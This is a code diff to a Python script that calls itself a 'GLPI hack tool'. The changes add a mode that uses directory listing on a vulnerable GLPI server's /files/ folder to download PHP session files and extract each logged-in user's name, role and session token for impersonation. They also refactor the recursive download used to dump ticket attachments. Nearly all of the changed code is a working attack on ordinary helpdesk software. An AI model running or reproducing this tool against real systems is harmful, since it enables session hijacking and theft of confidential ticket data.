@@ -9,7 +9,7 @@ parser = argparse.ArgumentParser(description='GLPI hack tool')
 parser.add_argument('--url', help="URL of the GLPI instance", required=True)
 parser.add_argument('--dumpfiles',help="Dump the stored ticket attachments", action="store_true")
 parser.add_argument('--check',help="Only check if the taget is vulnerable", action="store_true")
-parser.add_argument('--token', help="Get valid session tokens for impersonation.", action="store_true")
+parser.add_argument('--sessions', help="Get valid session tokens for impersonation.", action="store_true")
 parser.add_argument('--exploit', help="Attempts to exploit the plulginimage vulnerability to get directory listing on /files.", action="store_true")
 
 args = parser.parse_args()
@@ -50,9 +50,15 @@ def dumpFiles():
     if not checkFiles():
         print("Directory listing is not enabled on /files. use --exploit to exploit the pulginimage vulnerability.")
     else:
-        read_url(args.url + "/files/")
+        recursive_download(args.url + "/files/", False)
 
-def read_url(url):
+def dumpSessions():
+    if not checkFiles():
+        print("Directory listing is not enabled on /files. use --exploit to exploit the pulginimage vulnerability.")
+    else:
+        files = recursive_download(args.url + "/files/_sessions/", True)
+
+def recursive_download(url, session):
     url = url.replace(" ","%20")
     req = Request(url)
     a = urlopen(req).read()
@@ -63,15 +69,28 @@ def read_url(url):
         url_new = url + file_name
         url_new = url_new.replace(" ","%20")
         if(file_name[-1]=='/' and file_name != 'Name' and file_name != 'Last Modified' and file_name != "Size" and file_name != "Description" and file_name != "Parent Directory"):
-            read_url(url_new)
+            recursive_download(url_new, session)
         if (file_name[-1] != '/' and file_name != 'Name' and file_name != 'Last modified' and file_name != "Size" and file_name != "Description" and file_name != "Parent Directory"):
             res = requests.get(url_new)
             filename = url_new.split('files/')[1:]
             filename = "./dump/" + "".join(filename)
-            print(filename)
             os.makedirs(os.path.dirname(filename), exist_ok=True)
             with open(filename, "wb") as f:
-                f.write(res.content)            
+                f.write(res.content)
+            if session:
+                extractSessionsInfo(filename)
+            else:
+                print(filename)
+
+def extractSessionsInfo(filename):
+    with open(filename) as f:
+        session = f.read()
+        valid = bool(re.search("glpiname\\|", session))
+        if valid:
+            username = session.split('glpiname|')[1].split('"')[1]
+            role = session.split('glpiprofiles|')[1].split('"name"')[1].split('"')[1]
+            token = filename.split('/')[-1].split("sess_")[1]
+            print('Session found : \n Username : ' + username + '\n Role : ' + role +'\n Token : ' + token)
 
 def exploit():
     if checkVulnerable() and not checkFiles():
@@ -96,6 +115,9 @@ if args.exploit:
 if args.dumpfiles:
     dumpFiles()
 
-if not args.check and not args.dumpfiles and not args.exploit and not args.token:
+if args.sessions:
+    dumpSessions()
+
+if not args.check and not args.dumpfiles and not args.exploit and not args.sessions:
     print('Please specify something to do. (use -h to get the help menu)')
     quit()
